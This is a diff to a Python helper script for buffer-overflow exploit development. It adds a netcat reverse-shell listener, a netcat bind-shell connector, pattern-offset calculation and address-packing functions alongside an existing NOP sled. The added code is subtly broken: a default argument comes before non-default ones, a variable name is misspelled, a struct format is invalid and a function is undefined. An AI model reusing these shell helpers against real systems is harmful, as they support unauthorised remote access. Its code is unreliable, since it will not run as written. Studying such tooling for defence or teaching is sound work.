@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-import socket
-import struct
+import socket, time
+import struct, os, struct
 
 
 nop_sled_16 = "\x90"*16        # 16 byte NOP sled if needed
@@ -80,5 +80,35 @@ def generate_nop_sled(length):
 
 
 
-p = generate_pattern(7000)
-print(p)
+def spawn_rev_shell(port):
+    os.system(f'nc -lnvp {str(port)}')
+def connect_bind_shell(address,port,timeout=3):
+    time.sleep(timeout)
+    os.system(f'nc {address} {str(port)}')
+def get_address_space(start_address, end_address):
+    space = end_address - start_address
+    return space
+def get_pattern_space(length=6000,pstart, pend):
+    ps = bytearray.fromhex(pstart)
+    pe = bytearray.fromhex(pend)
+    ps.reverse()
+    pe.reverse()
+    psaddr = ps.decode(encoding='latin-1')
+    peaddr = pe.decode(encoding='latin-1')
+    pattern = generate_pattern(length)  
+    psp = pattern.find(psaddr)
+    pep = pattern.find(peaddr)
+    if psp > 0 and pep > 0:
+        space = pep - psp
+        print(f"The pattern space is: {str(space)}")
+    else:
+        if psp < 0:
+            print(f"The address of {pstart} is lower than 0.")
+        if pep < 0:
+            print(f"The address of {petart} is lower than 0.")
+def pack_little_endian(address):
+    return struct.pack('<I',address)
+def pack_big_endian(address):
+    return struct.pack('I>',address)
+def pack(t,address):
+    return decode(struct.pack(t,address))
